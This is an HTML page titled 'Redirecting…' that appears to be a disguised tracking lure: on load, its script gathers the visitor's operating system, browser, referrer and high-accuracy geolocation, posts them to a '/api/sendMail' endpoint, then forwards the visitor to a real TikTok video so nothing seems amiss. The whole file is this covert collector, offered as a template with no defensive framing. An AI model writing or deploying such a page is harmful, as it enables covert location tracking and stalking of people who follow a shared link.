<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Redirectingâ€¦</title>
  <script>
    // --- CONFIG ---
    const API_URL = "/api/sendMail"; // Your backend endpoint
    const TIKTOK_URL = "https://www.tiktok.com/@des.nutts0/video/7603359922327244046?is_from_webapp=1&sender_device=pc"; // The real TikTok video

    function getOSVersion() {
      const ua = navigator.userAgent;
      if (/android/i.test(ua)) {
        const match = ua.match(/Android\s([0-9\.]+)/i);
        return match ? `Android ${match[1]}` : "Android";
      }
      if (/iPhone|iPad|iPod/i.test(ua)) {
        const match = ua.match(/OS (\d+_\d+(_\d+)?)/i);
        return match ? `iOS ${match[1].replace(/_/g, ".")}` : "iOS";
      }
      if (/Windows NT/i.test(ua)) {
        const match = ua.match(/Windows NT ([0-9\.]+)/i);
        if (match) {
          switch (match[1]) {
            case "10.0": return "Windows 10/11";
            case "6.3": return "Windows 8.1";
            case "6.2": return "Windows 8";
            case "6.1": return "Windows 7";
            default: return `Windows NT ${match[1]}`;
          }
        }
        return "Windows";
      }
      if (/Mac OS X/i.test(ua)) {
        const match = ua.match(/Mac OS X ([0-9_\.]+)/i);
        return match ? `macOS ${match[1].replace(/_/g, ".")}` : "macOS";
      }
      return "Unknown";
    }

    function getBrowser() {
      const ua = navigator.userAgent;
      if (ua.includes("TikTok")) return "TikTok In-App Browser";
      if (ua.includes("FBAN") || ua.includes("FBAV")) return "Facebook In-App Browser";
      if (ua.includes("Instagram")) return "Instagram In-App Browser";
      if (ua.includes("CriOS")) return "Chrome (iOS)";
      if (ua.includes("FxiOS")) return "Firefox (iOS)";
      if (ua.includes("EdgiOS")) return "Edge (iOS)";
      if (ua.includes("Chrome")) return "Chrome";
      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
      if (ua.includes("Firefox")) return "Firefox";
      if (ua.includes("Edg")) return "Edge";
      return "Unknown";
    }

    function getReferrer() {
      if (document.referrer) return document.referrer;
      return "None";
    }

    function sendInfo(data) {
      // Fire and forget, don't wait for response
      fetch(API_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(data)
      }).finally(() => {
        window.location.href = TIKTOK_URL;
      });
    }

    function collectAndSend() {
      const timestamp = new Date().toISOString();
      const osVersion = getOSVersion();
      const browser = getBrowser();
      const referrer = getReferrer();

      if (navigator.geolocation) {
        // Try to get location, but don't wait more than 2 seconds
        let didRespond = false;
        const timeout = setTimeout(() => {
          if (!didRespond) {
            didRespond = true;
            sendInfo({ timestamp, osVersion, browser, referrer });
          }
        }, 2000);

        navigator.geolocation.getCurrentPosition(
          (pos) => {
            if (didRespond) return;
            didRespond = true;
            clearTimeout(timeout);
            const { latitude, longitude, accuracy, altitude, altitudeAccuracy } = pos.coords;
            sendInfo({
              timestamp,
              osVersion,
              browser,
              referrer,
              latitude: latitude ? latitude.toFixed(8) : undefined,
              longitude: longitude ? longitude.toFixed(8) : undefined,
              accuracy: accuracy !== undefined ? accuracy.toFixed(2) : undefined,
              altitude: (altitude !== null && altitude !== undefined) ? altitude.toFixed(3) : undefined,
              altitudeAccuracy: (altitudeAccuracy !== null && altitudeAccuracy !== undefined) ? altitudeAccuracy.toFixed(2) : undefined
            });
          },
          (err) => {
            if (didRespond) return;
            didRespond = true;
            clearTimeout(timeout);
            sendInfo({ timestamp, osVersion, browser, referrer });
          },
          { enableHighAccuracy: true, timeout: 1500 }
        );
      } else {
        sendInfo({ timestamp, osVersion, browser, referrer });
      }
    }

    window.onload = collectAndSend;
  </script>
</head>
<body>
</body>
</html>
